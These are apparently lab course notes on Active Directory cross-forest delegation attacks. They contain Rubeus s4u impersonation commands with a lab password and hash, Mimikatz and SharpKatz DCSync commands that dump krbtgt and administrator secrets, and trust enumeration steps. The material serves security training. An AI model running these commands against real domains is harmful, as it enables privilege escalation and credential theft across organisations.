# Cross Forest Attacks - Delegations

- [Cross Forest Attacks - Delegations](#cross-forest-attacks---delegations)
  - [Privilege Escalation - Constrained Delegation with Protocol Transition](#privilege-escalation---constrained-delegation-with-protocol-transition)
  - [Cross Forest - Unconstrained Delegation](#cross-forest---unconstrained-delegation)

---

## Privilege Escalation - Constrained Delegation with Protocol Transition

The classic Constrained Delegation does not work across forest trusts, but we can abuse it once we have a beachhead/foothold across forest trust.

- PowerView

```
Get-DomainUser –TrustedToAuth -Domain eu.local
Get-DomainComputer –TrustedToAuth -Domain eu.local
```

- AD Module

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
```

<br/>

We can request an alternate ticket using Rubeus:

```
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local
```

```
C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:068A0A7194F8884732E4F5A7CB47E17C /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

<br/>

Abuse the TGS to LDAP:

- Mimikatz

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"'
```

- SharpKatz.exe

```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
```

```
C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local
```

<br/>

## Cross Forest - Unconstrained Delegation

Recall the Printer bug and its abuse from a machine with Unconstrained Delegation - we have used it to escalate privileges to Domain Admin and Enterprise Admin.

- It also works across a **Two-way forest trust with TGT Delegation** enabled!

**TGT Delegation is disabled by default** and must be explicitly enabled across a trust for the trusted (target) forest.

In the lab, `TGTDelegation` is set from `usvendor.local `to `techcorp.local` (but not set for the other direction).

<br/>

**Enumeration**

To enumerate if `TGTDelegation` is enabled across a forest trust, run the below command from a DC:

```
netdom trust <trustingforest> /domain:<trustedforest> /EnableTgtDelegation
```

```
LAB: <br/>
See if `usvendor.local` trusts `techcorp.local`, run the following in `usvendor-dc`.

netdom trust usvendor.local /domain:techcorp.local /EnableTgtDelegation
```

Note:
The PowerShell cmdlets of the ADModule seems to have a bug, the below command shows TGTDelegation set to `False`:
`Get-ADTrust -server usvendor.local -Filter *`
- But when run from `usvendor-dc`, it shows `TGTDelegation` to be `True`.

<br/>

